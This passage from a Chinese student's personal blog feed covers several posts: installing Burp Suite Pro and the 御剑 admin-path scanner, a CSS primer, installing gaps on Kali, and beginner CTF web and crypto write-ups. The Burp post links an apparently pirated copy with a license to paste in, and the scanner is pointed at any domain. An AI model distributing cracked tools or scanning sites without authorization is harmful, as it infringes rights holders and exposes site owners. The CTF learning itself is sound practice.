loading="lazy"><br>确定，保存！！！！最后一步完成！！再检测一下，打开cmd,Windows+R快速打开cmd,输入<code>java</code><br><img src="https://img-blog.csdnimg.cn/20200215220343273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>再输入<code>javac</code><br><img src="https://img-blog.csdnimg.cn/20200215220448872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>查看版本输入<code>java -version</code><br><img src="https://img-blog.csdnimg.cn/20200215220550386.png" alt="在这里插入图片描述" loading="lazy"><br>好啦，Java环境已经配置完成啦，呱唧呱唧哈哈哈<br><img src="https://img-blog.csdnimg.cn/20200215220753976.jpg" alt="在这里插入图片描述" loading="lazy"></p><h1 id="burpsuite的配置和使用"><a href="#burpsuite的配置和使用" class="headerlink" title="burpsuite的配置和使用"></a>burpsuite的配置和使用</h1><p>使用这个工具需要Java环境，我们上面已经配置好了！！<br>先下载，可以官网下载，不过这个正品需要money，害，不说了，直接上<br>百度网盘：链接：<a href="https://pan.baidu.com/s/1zMeH8A0WKw1UmdIxbPuBLQ">https://pan.baidu.com/s/1zMeH8A0WKw1UmdIxbPuBLQ</a><br>提取码：mwql<br>下载压缩包后解压双击<br><img src="https://img-blog.csdnimg.cn/20200215222411478.png" alt="在这里插入图片描述" loading="lazy"><br>会出现<br><img src="https://img-blog.csdnimg.cn/20200215222754298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>点run会打开burp suite_pro_v1.7.37，将上一张图中的license复制粘贴到这里，点next。<br><img src="https://img-blog.csdnimg.cn/20200215222929445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>最后完成时<br><img src="https://img-blog.csdnimg.cn/20200215223347944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>哎妈呀，终于好了，为了看到这个画面，我花费了整整一天的时间，<br>哇咔咔，<img src="https://img-blog.csdnimg.cn/20200215223738959.jpg" alt="在这里插入图片描述" loading="lazy"><br>激动的心，颤抖的手！！！</p><h1 id="下载御剑"><a href="#下载御剑" class="headerlink" title="下载御剑"></a>下载御剑</h1><p>御剑后台扫描珍藏版是T00LS大牛的作品,方便查找用户后台登陆地址，同时也为程序开发人员增加了难度，尽量独特的后台目录结构。<br>附带很强大的字典，字典我们也是可以自己修改的，继续增加规则。<br>御剑后台扫描工具 简介：</p><p>1、扫描线程自定义:用户可根据自身电脑的配置来设置调节扫描线程</p><p>2、集合DIR扫描 ASP ASPX PHP JSP MDB数据库 包含所有网站脚本路径扫描</p><p>3、默认探测200 (也就是扫描的网站真实存在的路径文件)<br> 百度网盘链接：链接：<a href="https://pan.baidu.com/s/1czUTNposkeMRn1FC-s1F1w">https://pan.baidu.com/s/1czUTNposkeMRn1FC-s1F1w</a><br>提取码：6509<br><strong>御剑使用</strong><br>使用方法也非常简单，只需要在“域名框”输入你要扫描的域名即可！然后点击扫描。<br><img src="https://img-blog.csdnimg.cn/20200215224532580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这次知识很多，要好好消化消化，哈哈哈。用过之后感觉这工具真好玩，好了，此次分享到此结束，哈哈哈！</p><p><img src="https://img-blog.csdnimg.cn/20200215224906431.jpg" alt="在这里插入图片描述" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML之CSS的简单学习</title>
      <link href="/posts/1ab8d2c2/"/>
      <url>/posts/1ab8d2c2/</url>
      
        <content type="html"><![CDATA[<p>CSS：层叠样式表(英文全称：Cascading Style Sheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。<br>CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力<br>CSS在网页开发中是起装饰作用，如果把一个 漂亮的网页看成是一个人，HTML纯文本就是相当于一个“裸体人”，而CSS则是“衣服”，JavaScript就是“肢体动作”，三者共同组成一个完美的整体。</p><h2 id="CSS形式"><a href="#CSS形式" class="headerlink" title="CSS形式"></a>CSS形式</h2><p>一、最初的CSS是包含在标签里，通过标签属性style表现出来。</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token operator">&lt;</span>p style<span class="token operator">=</span><span class="token string">"background: red;color: blue;shape-rendering: all;"</span><span class="token operator">></span>字体<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span></code></pre><p>这样就能把内容进行修饰，但是这样写有它的缺点：<br>1.对于浏览器来说比较费时，要改很多东西。<br>2.对于开发人员来说，很复杂，很难维护。<br>二、同样的，不过是把style里的内容放在标签外面。</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token operator">&lt;</span>style<span class="token operator">></span> p<span class="token punctuation">&#123;</span>color<span class="token punctuation">:</span>red<span class="token punctuation">;</span>   background<span class="token punctuation">:</span>black<span class="token punctuation">;</span>   width<span class="token punctuation">:</span><span class="token number">100</span>px<span class="token punctuation">;</span>   height<span class="token punctuation">:</span><span class="token number">100</span>px<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">></span><span class="token operator">&lt;</span>p<span class="token operator">></span>字体<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span><span class="token operator">&lt;</span>p<span class="token operator">></span>属性<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span><span class="token operator">&lt;</span>p<span class="token operator">></span>形状<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span></code></pre><p>这样可以应用到多个标签，像这样：<br><img src="https://img-blog.csdnimg.cn/20200207191609228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>三、再打开一个文件，只编写CSS代码<br>把style里的内容放到新文件里，用link标签连接两个文件。<br><img src="https://img-blog.csdnimg.cn/20200207193146998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>结果不变：<br><img src="https://img-blog.csdnimg.cn/20200207193337738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>以上是CSS的三种基本形式。</p><h2 id="CSS语法"><a href="#CSS语法" class="headerlink" title="CSS语法"></a>CSS语法</h2><pre class="language-css" data-language="css"><code class="language-css">p <span class="token comment">/*选择器*/</span> <span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span>   <span class="token property">background</span><span class="token punctuation">:</span>yellow<span class="token punctuation">;</span>   <span class="token property">width</span><span class="token punctuation">:</span>100px<span class="token punctuation">;</span>   <span class="token property">height</span><span class="token punctuation">:</span>100px<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*大括号里面的是样式内容*/</span></code></pre><p>多条属性之间用分号<code>  ；</code>隔开，格式为：<code>属性名: 属性值；</code><br>注释：<code>/*注释内容*/</code><br><strong>颜色</strong>：<br>   <strong>1.rgb模式</strong><br>r：红色<br>g：绿色<br>b：蓝色<br>颜色由浅到深—&gt;可由数值0-255表示，也可用百分数表示，比如：</p><pre class="language-go" data-language="go"><code class="language-go">color<span class="token punctuation">:</span><span class="token function">rgb</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>color<span class="token punctuation">:</span><span class="token function">rgb</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">%</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token operator">%</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token operator">%</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>2.直接写名称</strong></p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">p</span><span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>这种是我常用的一种形式。</p><p><strong>3.16进制</strong><br>r：红色   FF<br>g：绿色  FF<br>b：蓝色 FF<br>FF表示15*15，结果是255，是最深的，00表示0，最浅的。<br>那么颜色可以这样表示 ：红色：#FF0000<br>两个数代表一种颜色，就像rgb(255,0,0)</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">p</span> <span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span><span class="token function">rgb</span><span class="token punctuation">(</span>255<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span><span class="token function">rgb</span><span class="token punctuation">(</span>50%<span class="token punctuation">,</span>25%<span class="token punctuation">,</span>25%<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>#ff0000<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>选择器</strong><br>作用：通过选择器可以找到HTML里对应的元素，并且把选择器后面的样式传递给元素。</p><pre class="language-go" data-language="go"><code class="language-go">div <span class="token punctuation">&#123;</span>background<span class="token punctuation">:</span> blue<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>比如说这个，通过这行代码，找到所有的<code>div</code>并把样式值改成背景颜色为<code>blue</code>。<br>选择器分为四大类<br>1.基本选择器<br>2.组合选择器<br>3.属性选择器<br>4.伪元素选择器<br>基本选择器：通配符选择器（*）、标签选择器（div…）、id选择器、class选择器。下面看样例：<br><img src="https://img-blog.csdnimg.cn/20200207203438545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>注意写代码的格式一定要写正确。<br>结果：<br><img src="https://img-blog.csdnimg.cn/20200207203606112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>没有什么比实例更易懂的了吧。哈哈哈<del>~</del><br>class选择器：<br>可以同时兼具多个class选择器的内容，<br><img src="https://img-blog.csdnimg.cn/20200207205741454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200207205843299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>上面的样例同时具备两个class的属性。<br>现在用的比较多的还是class选择器，也不是说id选择器不常用，而是，在CSS里面用的相对较多的还是class选择器，而id选择器则在JavaScript里用的比较多，因为id选择器针对性比较强。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gaps的安装__kali</title>
      <link href="/posts/a8049c29/"/>
      <url>/posts/a8049c29/</url>
      
        <content type="html"><![CDATA[<p>经过多次尝试和学长的点拨，我终于把gaps安装成功了，中间遇到了好多坑，装了n遍，终于坚持下来还是成功了，所以就记录一下解决办法。<br>先看安装的步骤</p><blockquote><p>git clone <a href="https://github.com/nemanja-m/gaps.git">https://github.com/nemanja-m/gaps.git</a><br>cd gaps<br>pip install -r requirements.txt<br>sudo apt-get install python-tk<br>pip install -e .</p></blockquote><p>这个安装步骤是参考大佬的博客<a href="http://www.ga1axy.top/index.php/archives/6/#gaps%EF%BC%88%E6%8B%BC%E5%9B%BE%EF%BC%89">安装gaps</a><br>然后看我的错误<br>前两步没出错，在第三步出错了，<br><code>pip3 install -r requirements.txt</code>，kali我用的是python3，所以用pip3<br>报错是</p><p><img src="https://img-blog.csdnimg.cn/20200406225158934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>之前一直在这里卡住，各种办法尝试，改文件，改版本。后来学长说他把numpy直接删除了，就行了。我也删。<br>操作：打开<code>requirements.txt</code>文件，把第一行删了。（急着赶下一步忘了截图）<br>然后重新执行该命令，发现还有报错，<br>就是跟下面这张图差不多的错误（忘了截图），意思就是我的opencv-python这个库版本低，不符合按照安装要求。解决办法是在文件里手动改版本<br>操作：打开<code>requirements.txt</code>文件，然后就把opencv-python的版本号改成符合要求的就行。我填的是<code>4.2.0.32</code>。<br>重新运行命令，结果再次报错。<br><img src="https://img-blog.csdnimg.cn/20200406225751911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>再改，百度一下新的<code>matplotlib</code>的版本，看看别人的版本号是多少，（因为这次报错，它没有显示并列出符合的版本），改一下。我这里是<code>3.0.3</code>，到这里做个对比，（当然不嫌弃的话可以按照我的修改）。<br><img src="https://img-blog.csdnimg.cn/2020040623205799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>再次运行命令。<br><img src="https://img-blog.csdnimg.cn/2020040623102972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>发现报错全没啦。可以进行下一步了。<br>我是root用户登陆，所以不用sudo，直接<code>apt-get install python-tk</code><br><img src="https://img-blog.csdnimg.cn/20200406231109910.png" alt="Augenstern" loading="lazy"><br>下一步，也是最后一步。<br><code>pip3 install -e .</code></p><blockquote><p>注意-e后面的点（.）不能丢了。最好直接复制步骤。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200406231648443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>成功，试试解这次比赛的题<br><img src="https://img-blog.csdnimg.cn/20200406231729836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>成功，看效果<img src="https://img-blog.csdnimg.cn/20200406231808496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>到这里安装全部结束，激动的我赶紧拍个快照<code>留个纪念</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF做题总结之bugku新手篇</title>
      <link href="/posts/1ee085f4/"/>
      <url>/posts/1ee085f4/</url>
      
        <content type="html"><![CDATA[<p>因为最近这个新型冠状病毒，无奈只能在家为国家做贡献啦，有多无聊，经历的人都懂，居然学习啦，别说还挺有意思。害！！写了几道题，做个总结笔记吧。</p><h3 id="（一）计算器"><a href="#（一）计算器" class="headerlink" title="（一）计算器"></a>（一）计算器</h3><p>这道题是在bugku的一道web题，进入看到题目，<img src="https://img-blog.csdnimg.cn/20200211150528891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>哎！我去，这么简单，一道小学加法题，然后我就算了一下，秒出答案，自信满满！！！填!!!!然后尴尬了，突然感觉一队乌鸦在头顶飞……噗，，，什么鬼只能填一个数字？？？？<br><img src="https://img-blog.csdnimg.cn/20200211151410905.jpg" alt="在这里插入图片描述" loading="lazy"><br>我cao,还是太年轻。一个一个试，从0<del>9挨个试，因为没有办法，相信好多像我一样的小白都这样试过，虽然知道不可能是对的，但还是要试一下，，哎？你别说，还真是错的，hhh.现在想想它为什么只能填一个数字，emmmmm.之前学过HTML的一点知识，肯定跟代码有关，然后我就右键单击查看源代码，还真找到了，<img src="https://img-blog.csdnimg.cn/20200211152223346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>看来方向是对了，这时候我突然想到一个很致命的问题，噗。。。。我不会改！！！<br>唉！有问题找度娘，找了半天，我最后发现我进入了一个误区，就是我是先查看源代码然后再改的，结果无法修改成功，<strong>解决方法</strong>:直接在题的界面按F12然后修改就可以了，再把那道加法题做出来就行了。<img src="https://img-blog.csdnimg.cn/20200211155632645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>哎，香！！终于做出来了。<br>不过，我还看到有第二种方法，来看<br><img src="https://img-blog.csdnimg.cn/20200211172926981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这道题时验证码而且没有用表单验证，最重要的一个细节是源代码里有两个js文件，打开来看看，第一个<br><img src="https://img-blog.csdnimg.cn/20200211174648320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>我丢，丝毫看不懂。再看第二个<br><img src="https://img-blog.csdnimg.cn/20200211174810342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>哇塞，发现了新大陆。吼吼吼</del>flag藏在这里啦。</p><h3 id="二-web2"><a href="#二-web2" class="headerlink" title="(二)web2"></a>(二)web2</h3><p>一打开这道题看的我有点蒙，哈哈哈，我笑了好多表情，越来越快，逗死了。<br>好了，不闹了，题目说，聪明的人都能找到答案，嘿嘿，我还真的去看了，我看完了，最后变成空白，也还是啥也没找到，当然这是肯定的。那我下一步的想法就是，web题嘛，先看源代码，F12直接搞起，嘿，真别说，还真是让找的<br><img src="https://img-blog.csdnimg.cn/20200211222828451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br> 这里他用HTML里的注释语给注释起来了。</p><h3 id="（三-你必须让他停下"><a href="#（三-你必须让他停下" class="headerlink" title="（三)你必须让他停下"></a>（三)你必须让他停下</h3><p> 这道题哈，说实话，我取巧了，通过传送门进到题目中，画面一直在动，还是那句话，做web题，我现在本能反应就是F12，哈哈哈！仔细观察，我看到<code>flag is here</code>这里我多看了会儿，然后我发现了flag，不过它很快就过去了，我就拿手机在他刚好到flag的时候拍了下来，这个也是一种办法吧。</p><h3 id="（四）web基础-GET"><a href="#（四）web基础-GET" class="headerlink" title="（四）web基础$_GET\"></a>（四）web基础$_GET\</h3><p> 这道题呢，有点熟悉。想起来啦，之前在学校的时候学长教过，当时没做出来，不过再想也是挺简单的。<br> <img src="https://img-blog.csdnimg.cn/20200213144819645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br> 这是一条php语句，意思是如果<code>what=flag</code>就可以打印出来flag。那就来试试<br> 在<code>url</code>中增加<code>?what=flag</code><br> <img src="https://img-blog.csdnimg.cn/20200213145202239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br> flag出来了。</p><h3 id="（五）web基础-POST"><a href="#（五）web基础-POST" class="headerlink" title="（五）web基础$_POST"></a>（五）web基础$_POST</h3><p> 害，这道题虽说简单，知道怎么写的，但是着实费了我好长时间。来看正确做法吧，这个要用到一个插件：火狐里的hackbar，但是这个在新版火狐里要收费了，害，可怜我这穷学生，只能百度去找解决办法了，有好几种解决办法：<br> 1.卸载新火狐，下载个老版本的火狐，最好是2.1.3版本的，害，我个人就喜欢用新的，不喜欢用老的版本，那我只能选择第二种办法啦~<br> 2.找代替品，火狐里还有与他功能相似的插件<img src="https://img-blog.csdnimg.cn/20200213162655549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br> 这里我选择的是第二个，🆗，现在万事俱备，开始解题~哇咔咔<br> <img src="https://img-blog.csdnimg.cn/20200213162854584.png" alt="在这里插入图片描述" loading="lazy"><br> run一下flag就出来了<br> <img src="https://img-blog.csdnimg.cn/20200213162944821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br> ok,这道题也写出来啦，开森，hhh</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF做题笔记(2)+第一次团队内比赛</title>
      <link href="/posts/393f811d/"/>
      <url>/posts/393f811d/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>把之前做过的几个题总结了下，这篇博客在草稿箱里待了好久了，也该放出来了。</p><h3 id="明文"><a href="#明文" class="headerlink" title="明文"></a><h3 id="1">明文</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200315152407216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>下载好就是这样一个文件：<br><img src="https://img-blog.csdnimg.cn/20200315152549814.png" alt="在这里插入图片描述" loading="lazy"><br>把它改成压缩包<code>.zip</code>再打开，果然是有东西的<br><img src="https://img-blog.csdnimg.cn/20200315152813306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>打开提示文本<br><img src="https://img-blog.csdnimg.cn/20200315152853632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>打开压缩包发现了加密的Word文档<br><img src="https://img-blog.csdnimg.cn/20200315161712819.png" alt="在这里插入图片描述" loading="lazy"><br>用ARCHPR暴力破解zip密码<br><img src="https://img-blog.csdnimg.cn/20200315161320330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>密码拿到，<code>hahaha</code>，然后就可以打开那个文档了。<br><img src="https://img-blog.csdnimg.cn/20200315161813410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>一片空白，，接下来让空白的地方显示出来文字<br>找到搜索框，搜索<code>选项</code>两个字，<br><img src="https://img-blog.csdnimg.cn/20200315162225128.png" alt="在这里插入图片描述" loading="lazy"><br>然后找到视图（office的Word文档是显示）<br><img src="https://img-blog.csdnimg.cn/20200315162452784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后成功拿到flag<br><img src="https://img-blog.csdnimg.cn/2020031516253576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h3 id="Jefferson‘gun（杰弗逊的枪）"><a href="#Jefferson‘gun（杰弗逊的枪）" class="headerlink" title="Jefferson‘gun（杰弗逊的枪）"></a><h3 id="2">Jefferson‘gun（杰弗逊的枪）</h3></h3><p><img src="https://img-blog.csdnimg.cn/2020031516264342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>打开TXT后是这样的，<br><img src="https://img-blog.csdnimg.cn/20200315163037915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这个转轮密码就是根据密钥和密文将上面的13行字符串重新排序。按照密钥的顺序，现在的第二行重新排列后在第一行，其他同样如此，排好之后<img src="https://img-blog.csdnimg.cn/20200315163824541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后再根据密文来修改，密文的意思就是，拿第一行做个例子，在第一行找到N，把它前面的字母全都移到本行的最末尾，组成新的字符串。全部移动之后就是找到倒数第九列（至于为什么，百度我没找到，希望知道这个的大佬能指点一下，十分感谢！）。<br><img 